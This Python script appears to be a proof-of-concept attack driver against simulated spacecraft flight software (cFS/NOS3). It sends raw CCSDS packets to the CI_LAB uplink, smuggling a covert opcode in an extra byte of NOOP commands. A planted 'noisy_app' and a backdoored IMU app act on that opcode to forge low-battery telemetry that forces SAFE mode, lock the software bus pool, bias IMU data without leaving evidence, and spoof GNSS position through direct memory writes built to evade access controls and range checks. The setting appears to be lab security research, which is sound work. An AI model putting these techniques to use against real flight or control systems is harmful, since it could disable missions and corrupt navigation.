#!/usr/bin/env python3
"""
Piggyback PoC headless driver (no COSMOS GUI required).

Sends the verification ladder straight to CI_LAB's UDP uplink (5012) as raw
CCSDS packets, mirroring exactly what COSMOS would emit for
CI_DEBUG_PIGGYBACK_NOOP_CC. CI_LAB is a UDP->Software Bus bridge: it republishes
any well-formed CCSDS packet onto the bus unchanged, where the co-resident
noisy_app sniffer reads it.

Ladder:
  1. TO_LAB output enable      (so telemetry downlinks to the passive listener)
  2. control NOOP (8 bytes)    -> noisy_app stays silent; carrier acts normally
  3. EPS_SPOOF piggyback 0x02  (9 bytes) -> CI_LAB length error AND noisy_app
                                  reads opcode 0x02 -> forges low EPS HK -> LC
  4. SB_BURST piggyback 0x04   (9 bytes) -> noisy_app emits a capped SB burst

Wire format (cFS / CCSDS, big-endian primary header):
  bytes 0-1  StreamID (APID / MsgId)
  bytes 2-3  Sequence (0xC000 = unsegmented + command-type flag)
  bytes 4-5  Length   = total_packet_bytes - 7
  byte  6    function code (secondary cmd header)
  byte  7    checksum (NOT validated by CI_LAB in simulation)
  byte  8    [piggyback only] covert opcode -> read by noisy_app as buf[Size-1]

Usage: python3 drive_poc.py [FSW_IP] [DEST_IP]
  FSW_IP  default "auto" -> resolve the sc01-nos-fsw container IP on nos3-sc01
          (this repo's SC net is 192.168.41.0/24); falls back to 127.0.0.1.
  DEST_IP default 192.168.41.1 (nos3-sc01 gateway). Only used when downlink
          (re-)enable is requested with ENABLE_DOWNLINK=1.

DTU secured-fork adaptation (vs the Draco baseline this was ported from):
  - CI_LAB ingest port is 5012 here too (CI_LAB_BASE_UDP_PORT). Unchanged.
  - override mode re-arms actionpoint AP #0 (SAFE_ON_LOW_BAT -> RTS 4: force
    SAFE + comms downgrade), in parity with the Draco baseline. AP #0/WP #0 and
    RTS 4 were grafted from Draco. See nos3/cfg/nos3_defs/tables/lc_def_adt.c.
  - TO_LAB output is auto-enabled by COSMOS (to_enable_task.rb) and TO_LAB
    self-resolves its downlink destination, so we do NOT re-enable it by
    default (that would hijack the dest away from passive_listener:5013).
    Set ENABLE_DOWNLINK=1 to force the legacy enable behaviour.
"""
import os
import socket
import struct
import subprocess
import sys
import time

# Mode may be given as the first token or as the 3rd positional after the IPs:
#   drive_poc.py [ladder]                      full demo ladder (default)
#   drive_poc.py override                      re-arm AP0 + engage persistent EPS override -> sustained SAFE
#   drive_poc.py off                           clear a running EPS override / GNSS spoof (opcode 0x00)
#   drive_poc.py flood                         DESTRUCTIVE: SB pool lock (opcode 0x08) - needs a sim restart
#   drive_poc.py spoof | burst                 one-shot EPS_SPOOF (0x02) | SB_BURST (0x04)
#   drive_poc.py imu                           arm the IMU bias dead-drop (off-bus, 0x0A)
#   drive_poc.py gnss                          GNSS teleport to (0,0) (off-bus, 0x0C)
#   drive_poc.py gnss_drift                    GNSS slow plausible drift (off-bus, 0x0E)
#   drive_poc.py <FSW_IP> <DEST_IP> <mode>     explicit endpoints + mode
MODES = ("ladder", "override", "off", "flood", "spoof", "burst", "imu", "gnss", "gnss_drift")
_args = sys.argv[1:]
MODE = "ladder"
if _args and _args[0] in MODES:
    MODE = _args.pop(0)
FSW_IP = _args[0] if len(_args) > 0 else "auto"
DEST_IP = _args[1] if len(_args) > 1 else "192.168.41.1"
if len(_args) > 2 and _args[2] in MODES:
    MODE = _args[2]
CI_LAB_PORT = 5012
ENABLE_DOWNLINK = os.environ.get("ENABLE_DOWNLINK", "0") == "1"
FSW_CONTAINER = os.environ.get("FSW_CONTAINER", "sc01-nos-fsw")

CI_LAB_CMD_MID = 0x18E0   # carrier MID (CI_LAB_CMD_MID); noisy_app sniffs this
TO_LAB_CMD_MID = 0x18E8   # routed by SB to TO_LAB
LC_CMD_MID     = 0x18A4   # LC_CMD_MID (SET_AP_STATE re-arm)
NOOP_FC = 0x00            # CI_LAB_NOOP_CC / CARRIER_NOOP_FC

OP_DORMANT, OP_EPS_SPOOF, OP_SB_BURST, OP_EPS_OVERRIDE, OP_SB_FLOOD = 0, 2, 4, 6, 8
OP_IMU_BIAS = 0x0A        # covert-channel arm: drop /ram/.imu_cal for generic_imu
OP_GNSS_SPOOF = 0x0C      # off-bus: direct memory overwrite -> teleport peer GNSS to (0,0)
OP_GNSS_DRIFT = 0x0E      # off-bus: same vector, slow plausible position drift


def stamp(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def ccsds(stream_id, payload):
    """Primary header (StreamID, Sequence, Length) + packet data field.

    `payload` is the entire packet data field (secondary cmd header + any
    trailing bytes). CCSDS length = octets_in_data_field - 1 = total - 7.
    """
    length = len(payload) - 1
    return struct.pack(">HHH", stream_id, 0xC000, length) + payload


def noop(opcode=None):
    """8-byte control NOOP, or 9-byte piggyback NOOP carrying a trailing opcode."""
    sec = struct.pack(">BB", NOOP_FC, 0x00)  # function code + checksum
    if opcode is not None:
        sec += struct.pack(">B", opcode)     # the smuggled covert byte
    return ccsds(CI_LAB_CMD_MID, sec)


def to_lab_enable(dest_ip):
    ip = dest_ip.encode("ascii")[:20].ljust(20, b"\x00")
    sec = struct.pack(">BB", 0x02, 0x00) + ip  # TO_LAB_OUTPUT_ENABLE_CC = 2
    return ccsds(TO_LAB_CMD_MID, sec)


def resolve_fsw_ip():
    """Resolve the FSW container's IP on the nos3-sc01 bridge (host-reachable).
    Falls back to 127.0.0.1 if docker is unavailable or the container is down."""
    try:
        out = subprocess.check_output(
            ["docker", "inspect", "-f",
             "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
             FSW_CONTAINER],
            text=True, stderr=subprocess.DEVNULL).strip()
        return out or "127.0.0.1"
    except Exception:
        return "127.0.0.1"


def lc_set_ap0_active():
    """LC SET_AP_STATE: AP #0 (SAFE_ON_LOW_BAT) -> ACTIVE.
    FC 3 (LC_SET_AP_STATE_CC); payload APNumber=0, NewAPState=1 (LC_APSTATE_ACTIVE).
    AP #0 (DTU parity with Draco) defaults to ACTIVE, so this is a re-arm in case
    it has latched PASSIVE; once active, WP #0 (BatteryVoltage < 14800) fires
    RTS 4 (force SAFE + comms downgrade)."""
    sec = struct.pack(">BB", 0x03, 0x00) + struct.pack("<HH", 0, 1)
    return ccsds(LC_CMD_MID, sec)


def send(sock, pkt, label):
    sock.sendto(pkt, (FSW_IP, CI_LAB_PORT))
    stamp(f"{label}: {len(pkt)} bytes -> {FSW_IP}:{CI_LAB_PORT}  hex={pkt.hex()}")


def enable_downlink(s):
    stamp(f"TO_LAB enable (downlink dest {DEST_IP}:5013), 3x warm-up")
    for _ in range(3):
        send(s, to_lab_enable(DEST_IP), "TO_ENABLE")
        time.sleep(2)
    time.sleep(2)


def run_ladder(s):
    stamp("STEP 1 CONTROL: normal 8-byte NOOP (expect noisy_app silent)")
    send(s, noop(), "CONTROL_NOOP")
    time.sleep(4)
    stamp("STEP 2 EPS_SPOOF: 9-byte piggyback NOOP, opcode 0x02")
    send(s, noop(OP_EPS_SPOOF), "PIGGYBACK_0x02")
    time.sleep(10)
    stamp("STEP 3 SB_BURST: 9-byte piggyback NOOP, opcode 0x04")
    send(s, noop(OP_SB_BURST), "PIGGYBACK_0x04")
    time.sleep(4)
    stamp("Ladder complete.")


def run_override(s):
    """Re-arm AP #0, then engage the persistent reactive EPS override. With the
    override shadowing every real EPS HK, WP #0 stays FAIL and AP #0 fires
    RTS 4 (force SAFE + comms downgrade) - identical to the Draco baseline."""
    stamp("Re-arming AP #0 (LC SET_AP_STATE -> ACTIVE)")
    send(s, lc_set_ap0_active(), "LC_SET_AP0_ACTIVE")
    time.sleep(0.5)
    stamp("Engaging persistent EPS override (opcode 0x06) - expect RTS 4 (SAFE) shortly")
    send(s, noop(OP_EPS_OVERRIDE), "PIGGYBACK_0x06")
    stamp("Override is now self-sustaining. Send 'off' (opcode 0x00) to clear.")


def run_single(s, opcode, label):
    send(s, noop(opcode), label)


def main():
    global FSW_IP
    if FSW_IP == "auto":
        FSW_IP = resolve_fsw_ip()
        stamp(f"Resolved FSW_IP={FSW_IP} (container {FSW_CONTAINER})")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if ENABLE_DOWNLINK:
        enable_downlink(s)
    else:
        stamp("TO_LAB downlink left to COSMOS/self-resolve "
              "(set ENABLE_DOWNLINK=1 to force re-enable).")

    if MODE == "ladder":
        run_ladder(s)
    elif MODE == "override":
        run_override(s)
    elif MODE == "off":
        stamp("Clearing EPS override (opcode 0x00 DORMANT)")
        run_single(s, OP_DORMANT, "PIGGYBACK_0x00_OFF")
    elif MODE == "spoof":
        run_single(s, OP_EPS_SPOOF, "PIGGYBACK_0x02")
    elif MODE == "burst":
        run_single(s, OP_SB_BURST, "PIGGYBACK_0x04")
    elif MODE == "flood":
        stamp("DESTRUCTIVE: SB POOL LOCK (opcode 0x08). The sim will go dark; "
              "recover with `make stop` + relaunch (or save-run first).")
        run_single(s, OP_SB_FLOOD, "PIGGYBACK_0x08_FLOOD")
    elif MODE == "imu":
        stamp("COVERT CHANNEL: arm IMU bias (opcode 0x0A). noisy_app drops "
              "/ram/.imu_cal (a FILE, not the SB); the backdoored generic_imu app "
              "latches it, removes it, and slow-drifts its own gyro/accel TM on "
              "0x26 -> ADCS attitude determination. This arm is visible; the "
              "channel and the IMU bias produce ZERO further SB/EVS evidence.")
        run_single(s, OP_IMU_BIAS, "PIGGYBACK_0x0A_IMU")
    elif MODE == "gnss":
        stamp("OFF-BUS: GNSS teleport (opcode 0x0C). noisy_app writes the peer "
              "GNSS app's cached position (LastBusLat/Lon) directly in memory -> "
              "downlinked position jumps to Null Island (0,0). Never on the SB, so "
              "SB_ACL cannot block it. Send 'off' (opcode 0x00) to clear.")
        run_single(s, OP_GNSS_SPOOF, "PIGGYBACK_0x0C_GNSS")
    elif MODE == "gnss_drift":
        stamp("OFF-BUS: GNSS drift (opcode 0x0E). Same direct-memory vector, but a "
              "slow plausible offset (genuine position + a growing delta) that a "
              "range check will not catch - only a truth-vs-bus divergence does. "
              "Send 'off' (opcode 0x00) to clear.")
        run_single(s, OP_GNSS_DRIFT, "PIGGYBACK_0x0E_GNSS_DRIFT")

    s.close()


if __name__ == "__main__":
    main()
